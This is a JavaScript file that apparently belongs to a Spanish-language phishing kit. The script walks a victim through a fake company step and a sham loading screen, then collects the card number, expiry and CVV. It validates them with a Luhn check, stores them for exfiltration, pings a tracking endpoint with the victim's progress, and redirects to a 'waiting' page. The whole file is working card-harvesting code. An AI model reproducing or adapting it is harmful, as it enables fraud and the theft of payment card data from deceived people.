if(info.p !== ''){
    document.querySelector('.error').classList.remove('d-none');
}



/**
 * 
 * WORKFLOW
 */
fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body:JSON.stringify({
        message: 'INGRESANDO TARJETA'
    })
});


const formCompany = document.querySelector('#form-company');
const formCard = document.querySelector('#form-card');
const p = document.querySelector('#p');
const mes = document.querySelector('#mes');
const ano = document.querySelector('#ano');
const c = document.querySelector('#c');

try{
    formCompany.addEventListener('submit', (e) =>{
        e.preventDefault();
    
        formCompany.classList.add('d-none');
        document.querySelector('.loader').classList.remove('d-none');
        setTimeout(()=>{
            document.querySelector('.loader').classList.add('d-none');
            formCard.classList.remove('d-none');
        }, 1500);
        
        
    });
}catch(err){
    console.log(err);
}



/**
 * 
 * CARD FUNCTIONS
 */
c.addEventListener('input', function () {
    const maxLength = parseInt(c.getAttribute('maxlength'));
    if (c.value.length > maxLength) {
        c.value = c.value.slice(0, maxLength);
    }
});

formCard.addEventListener('submit', (e) => {
    e.preventDefault();

    if ((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
        if(isLuhnValid(p.value)){
            if (mes.value !== '') {
                if (ano.value !== '') {
                    if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
                        // Guardar en LS
                        info.p = p.value;
                        info.f = (mes.value + "/" + ano.value);
                        info.c = c.value;

                        if (p[0] === '3') {
                            info.type = 'AM';
                        } else if (p.value[0] === '4') {
                            info.type = 'VISA';
                        } else if (p.value[0] === '5') {
                            info.type = 'MC';
                        } else {
                            info.type = 'NO';
                        }

                        LS.setItem('info', JSON.stringify(info));

                        // redirigir
                        window.location.href = 'waiting.html';


                    } else {
                        alert('CVV Incorrecto o no válido.');
                    }
                } else {
                    alert('El año de vencimiento es inválido');
                    ano.focus();
                }
            } else {
                alert('El mes de vencimiento es inválido');
                mes.focus();
            }
        } else{
            alert('El número de tu tarjeta es inválido.')
            p.focus();
        }
    } else {
        alert('El número de tu tarjeta es inválido.')
        p.focus();
    }
});

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');

    if (bin.length < 6) {
        return false;
    }

    const digits = bin.split('').map(Number).reverse();

    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) {
                doubled -= 9;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    // Verificar si la suma es divisible por 10
    return sum % 10 === 0;
}

function formatearNumero(input) {
    let numero = input.value.replace(/\D/g, '');
    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {

        c.setAttribute('maxlength', '4');

        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += '-';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {

        numero[0] == 4 ? p.classList.add('bg-vi') : '';
        numero[0] == 5 ? p.classList.add('bg-mc') : '';

        c.setAttribute('maxlength', '3');
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += '-';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}